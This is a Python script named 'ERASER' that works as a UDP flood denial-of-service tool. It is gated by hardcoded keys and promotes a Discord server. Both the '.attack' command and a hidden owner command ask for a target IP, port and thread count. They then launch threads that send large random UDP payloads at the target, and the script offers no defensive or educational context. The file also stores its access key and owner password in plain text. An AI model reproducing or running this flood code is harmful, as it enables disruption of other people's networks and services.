from colorama import Fore, Back
import random, time, socket, os, threading
import requests
import sys

def clear():
    os.system("cls" if os.name == "nt" else "clear")

clear()

print(f"{Fore.RED}Made By strunneo")
key = input("🔑 Key: ")


if key == "strunneoisthebest":
    pass

else:
    print("Wrong Key, If You Want To Get One Join Our Discord Server")
    exit()

os.system("cls" if os.name == "nt" else "clear")

print(f"{Fore.RED}Made By strunneo")
f"{Fore.GREEN}"
welcome = """
\t\t\t\t▓█████  ██▀███   ▄▄▄        ██████ ▓█████  ██▀███  
\t\t\t\t▓█   ▀ ▓██ ▒ ██▒▒████▄    ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒
\t\t\t\t▒███   ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒███   ▓██ ░▄█ ▒
\t\t\t\t▒▓█  ▄ ▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  
\t\t\t\t░▒████▒░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒░▒████▒░██▓ ▒██▒
\t\t\t\t░░ ▒░ ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░
\t\t\t\t ░ ░  ░  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░
\t\t\t\t   ░     ░░   ░   ░   ▒   ░  ░  ░     ░     ░░   ░ 
\t\t\t\t   ░  ░   ░           ░  ░      ░     ░  ░   ░ 

\t\t\t\t                     Try help                                                   
"""
f"{Fore.WHITE}"
print(welcome)

while True:
    eraser = input("ERASER@ >>>> ")

    if eraser == "help" or eraser == "Help" or eraser == "HELP":
        print("-----------------------------------------------------")
        print(".discord to see our discord Server")
        print(".attack for attack!")
        print(".cls to clear console")
        print(".exit for exit")
        print(".owner for owner settings")
        print("-----------------------------------------------------")
        
    elif eraser == ".discord" or eraser == ".Discord" or eraser == ".DISCORD":
        print("https://discord.gg/z9TGqxeka7")

    elif eraser == ".cls" or eraser == ".CLS" or eraser == ".Cls":
        os.system("cls")
        print("Made By strunneo")
        print(welcome)

    elif eraser == ".attack" or eraser == ".ATTACK" or eraser == ".Attack":
        ip = input("Target IP 🦧: ")
        port = int(input("Target Port: "))
        threads = int(input("Amount Of Threads: "))
        print("Attack Successfully Started (☞ﾟヮﾟ)☞")

        def attack():
            attack = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            attack.connect((ip, port))

            for i in range(1, 100 * 1000):
                try:
                    attack.send(random._urandom(10) * 1000)
                except ConnectionRefusedError:
                    pass
            print(f"Send: {i}", end='\r')

        for i in range(threads):
            t = threading.Thread(target=attack)
            t.start()

    elif eraser == ".exit" or eraser == ".Exit" or eraser == ".EXIT":
        exit()

    elif eraser == ".owner" or eraser == ".Owner" or eraser == ".OWNER":
        OWNER_PASSWORD = input("Type Owner Password: ")
        if OWNER_PASSWORD == "gujassperma22":
            print("You Succsessfully Entered Owner Password. Type .ownerhelp")
            pass
        else:
            print("Wrong Owner Password")

        while True:
            owner_input = input("OWNER@ >>>>> ")
            if owner_input == ".ownerhelp" or owner_input == ".Ownerhelp" or owner_input == ".OWNERHELP":
                print("------------------------------------")
                print(".gujasblatnoiudari")
                print(".exitowner")
                print("------------------------------------")
            if owner_input == ".gujasblatnoiudari" or owner_input == ".Gujasblatnoiudari" or owner_input == ".GUJASBLATNOIUDARI":
                ip2 = input("Target IP 🦧: ")
                port2 = int(input("Target Port: "))
                threads2 = int(input("Amount Of Threads: "))
                print("Attack Successfully Started (☞ﾟヮﾟ)☞")

                def attack():
                    attack = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                    attack.connect((ip2, port2))

                    for i in range(1, 1000 * 10000):
                        try:
                            attack.send(random._urandom(100) * 10000)
                        except ConnectionRefusedError:
                            pass
                    print(f"Send: {i}", end='\r')

                for i in range(threads2):
                    t = threading.Thread(target=attack)
                    t.start()